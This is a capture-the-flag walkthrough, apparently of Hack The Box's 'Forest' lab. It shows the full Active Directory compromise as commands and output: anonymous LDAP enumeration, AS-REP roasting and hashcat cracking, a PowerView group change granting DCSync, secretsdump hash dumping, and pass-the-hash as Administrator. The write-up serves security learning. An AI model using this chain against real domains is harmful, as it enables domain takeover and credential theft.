# Initial Enemuration 
```bash
**sudo nmap -sS 10.129.63.155**
Starting Nmap 7.92 ( https://nmap.org ) at 2025-02-15 00:11 +01
Nmap scan report for 10.129.63.155
Host is up (0.10s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 30.46 seconds
```
from the nmap output it looks like it's a Domain Controller, let's find the name of the domain in question.
```bash
netexec smb 10.129.63.155

SMB         10.129.63.155   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```
# Enemurating services
after Enemurating services and find that it's possible to enumerate annonymously using ldap.
```bash
python3 windapsearch.py --dc-ip 10.129.63.155
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.63.155
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[*] Bye!
```
# LDAP
```bash
python3 windapsearch.py --dc-ip 10.129.63.155 -U
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.63.155
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 28 users: 

cn: Guest

cn: DefaultAccount

cn: Exchange Online-ApplicationAccount
userPrincipalName: Exchange_Online-ApplicationAccount@htb.local

cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
<snip>
```
The -U flag is used to enumerate all users.
 Let's enumerate all other objects in the domain using the objectClass=* filter.
 ```bash
**python3 windapsearch.py --dc-ip 10.129.63.155 --custom "objectClass=*"**
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.63.155
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=htb,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None
[+] Performing custom lookup with filter: "objectClass=*"
[+]	Found 312 results:

DC=htb,DC=local

CN=Users,DC=htb,DC=local

CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local

CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local

CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local

CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local

CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
<snip>
CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
<snip>
```
we found a lot of  unique objects, among which is a service account named svc-alfresco .Searching for alfresco online brings us to this [setup](https://docs.alfresco.com/process-services/latest/config/authenticate/) documentation. According to this, the service needs Kerberos pre-authentication to be disabled.
wich mean we can perform ASREPRoasting
### ASREPRoasting
It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.

With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
# Foothold
```bash
**GetNPUsers.py HTB.LOCAL/ -dc-ip 10.129.63.155 -no-pass -usersfile users**
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/home/usef/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:18bef812450fba6d540cb0dab8b1abea$e4289a48d9c74dcf931fb1f906bacb5d0f2d638053249696a271435923c973f7c0205a6e6a85c06665b23fb3db926f8b78a06e2250ceae5e2cf0d9f6d94a50c78200ffb33aa7c8ef0e191c01eb1d049e02c11dfb5230bdd4784374d6a3806402a8f84fff3022a6e8a2402672b4d78c2eef5c8868d04d54e7d5623dd1df97f523c87acf66ab7c50cd12a16c2fc65b67a3bd8ae16fcafd1778c0e992c3ed22a3e91bbbd05ade5e8f9a8a52b368cfeded0a167eee07f93a8809204eeecbee9ce03a21af27a1657eae18d6305e6fa6b878690a7626299983dc7d8069cee685ab953ab6a722c5a390
```
let's crack it
```bash
**hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt**
<[snip]>
$krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$
5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004
d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice
<snip>
```
let try to connect to WinRM using the svc-alfresco user
```bash
**evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.63.155**  
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        2/14/2025  10:38 AM             34 user.txt
```
# privilige escalation
### Bloodhound
let's try to enumerate the domain using the user svc-alfrsco.
```bash
**bloodhound-python  -u svc-alfresco -p s3rvice -ns 10.129.63.155 -d htb.local -c all**
```
![Screenshot from 2025-02-15 01-00-32](https://github.com/user-attachments/assets/f7d79e6e-0a5f-41b9-904d-8f52c2d713e2)
let try to see it the user have any rights, we go to Outbound object control seciotn and we see that the user have 88 Group Delegated Object Control	rights.
let's click on transitive object control to see what can we do with those rights

![Screenshot from 2025-02-15 01-09-19](https://github.com/user-attachments/assets/09e5b806-9f45-42b2-9349-ff89fe7a3eef)
we are intersted in this path beaceause is teh one taht goona give us full control on the domain.
nest group membreship gave svc-alfresco generic all on `EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL` so we can add a user to this group because membership in this group give us WriteDACL on the domain HTB.LOCAL using this we can grant a user or ourselves DCsync.
## Generic all
going back to the session we had on winrm, first I uploaded PowerVIew.ps1 scrit and Imported it to the session to use it.
now we can add ourselves to the EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL group, by abusing generic all right on this group.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> **Add-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS' -Members 'svc-alfresco'**
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> **Get-DomainGroupMember -Identity 'EXCHANGE WINDOWS PERMISSIONS'**


GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : svc-alfresco
MemberDistinguishedName : CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1147

GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Exchange Trusted Subsystem
MemberDistinguishedName : CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1119
```
we succesefully added svc-alfresco to the group.
## WriteDACL
With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.
```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> **Add-DomainObjectAcl -TargetIdentity htb.local -Rights DCSync**
```
## DCSync
now we can dump hashe of the entire users of the domain including `Administrator` by getting the Administrator hash we can say that we have abused the entire domain.
```bash
**secretsdump.py svc-alfresco:s3rvice@10.10.10.161**
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<snip>
```
# Full Control
```bash
**evil-winrm -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -i 10.129.63.155**
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
cbd74f640c6f3696d386a58eddc06ed5
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```






